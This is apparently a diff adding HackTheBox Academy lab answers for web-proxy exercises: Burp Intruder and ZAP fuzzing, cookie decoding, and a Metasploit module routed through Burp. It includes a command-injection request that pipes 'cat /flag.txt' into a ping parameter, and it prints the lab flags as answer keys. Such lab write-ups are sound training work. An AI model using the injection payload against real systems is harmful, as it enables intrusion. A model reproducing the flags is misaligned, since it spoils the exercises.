@@ -2378,45 +2378,134 @@ Results: msf test file
 
 ### Burp Intruder
 
-Question. 
+**Use Burp Intruder to fuzz for '.html' files under the /admin directory, to find a file containing the flag.**
+
+This is the request
 
 ```
-
+GET /admin/§flag§.html HTTP/1.1
+Host: 94.237.59.246:39867
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Upgrade-Insecure-Requests: 1
 ```
 
-Results: 
+In Burp Intruder set a Snipper attack. Use common.txt as payload. Run it and payload 2010 will return the flag.
+
+Results: HTB{burp_1n7rud3r_fuzz3r!}
 
  
 ### ZAP Fuzzer
 
-Question. 
+**The directory we found above sets the cookie to the md5 hash of the username, as we can see the md5 cookie in the request for the (guest) user. Visit '/skills/' to get a request with a cookie, then try to use ZAP Fuzzer to fuzz the cookie for different md5 hashed usernames to get the flag. Use the "top-usernames-shortlist.txt" wordlist from Seclists.**
 
-```
-
-```
-
-Results: 
+Results: HTB{fuzz1n6_my_f1r57_c00k13}
 
 ### ZAP Scanner
 
-Question. 
+**Run ZAP Scanner on the target above to identify directories and potential vulnerabilities. Once you find the high-level vulnerability, try to use it to read the flag at '/flag.txt'**. 
+
+The vulnerable endpoint contains a command injection vulnerability. This is the request: 
+
+```
+GET /devtools/ping.php?ip=|+cat+/flag.txt HTTP/1.1
+Host: 94.237.54.253:52356
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Referer: http://94.237.54.253:52356/index.php/2021/08/11/customer-support/
+Upgrade-Insecure-Requests: 1
 
 ```
 
+And this is the response:
+
+```
+HTTP/1.1 200 OK
+Date: Tue, 22 Oct 2024 16:54:31 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 156
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Ping</title>
+</head>
+
+<body>
+  HTB{5c4nn3r5_f1nd_vuln5_w3_m155}
+</body>
+
+</html>
 ```
 
-Results: 
+Results: HTB{5c4nn3r5_f1nd_vuln5_w3_m155}
 
 
 ### Skills Assessment - Using Web Proxies
 
-Question. 
+**The /lucky.php page has a button that appears to be disabled. Try to enable the button, and then click it to get the flag.**. 
 
 ```
-
+# Intercept traffic qith Burpsuite. Go to the website http://$ip:$port/lucky.php and remove in source code "disabled=""". Then click on the button. You will get a POST request to lucky.php in your intercepted traffic. Send it to Repeater module. Click on Send. Within the response, you will see:
+<p style="text-align:center">HTB{d154bl3d_bu770n5_w0n7_570p_m3}</p>
 ```
 
-Results: 
+Results: HTB{d154bl3d_bu770n5_w0n7_570p_m3}
+
+
+The /admin.php page uses a cookie that has been encoded multiple times. Try to decode the cookie until you get a value with 31-characters. Submit the value as the answer.. 
+
+```
+#  Intercept traffic qith Burpsuite. Go to the website http://$ip:$port/admin.php. See the "Set-Cookie: cookie=4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d"
+
+# Use Decoder. First, decode as ASCII hex, you will get:
+M2RhYzkzYjhjZDI1MGFhOGMxYTM2ZmZmYzc5YTE3YQ==
+
+# Use Decoder. Second, decode as Base64, you will get:
+3dac93b8cd250aa8c1a36fffc79a17a
+```
+
+Results: 3dac93b8cd250aa8c1a36fffc79a17a
+
+
+**Once you decode the cookie, you will notice that it is only 31 characters long, which appears to be an md5 hash missing its last character. So, try to fuzz the last character of the decoded md5 cookie with all alpha-numeric characters, while encoding each request with the encoding methods you identified above. (You may use the "alphanum-case.txt" wordlist from Seclist for the payload).** 
+
+![](img/proxy_00.png)
+
+![](img/proxy_01.png)
+
+Results:            HTB{burp_1n7rud3r_n1nj4!}
+
+**You are using the 'auxiliary/scanner/http/coldfusion_locale_traversal' tool within Metasploit, but it is not working properly for you. You decide to capture the request sent by Metasploit so you can manually verify it and repeat it. Once you capture the request, what is the 'XXXXX' directory being called in '/XXXXX/administrator/..'?**. 
+
+```
+msfconsole -q
+use auxiliary/scanner/http/coldfusion_locale_traversal
+options
+set RHOSTS $ip
+set RPORT $port
+set PROXIES HTTP:127.0.0.1:8080
+
+# Go to Burpsuite and check out the request
+GET /CFIDE/administrator/index.cfm HTTP/1.1
+Host: 94.237.62.154:37883
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0
+Connection: close
+```
+
+Results: CFIDE
 
 
 ## [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/module/details/54)
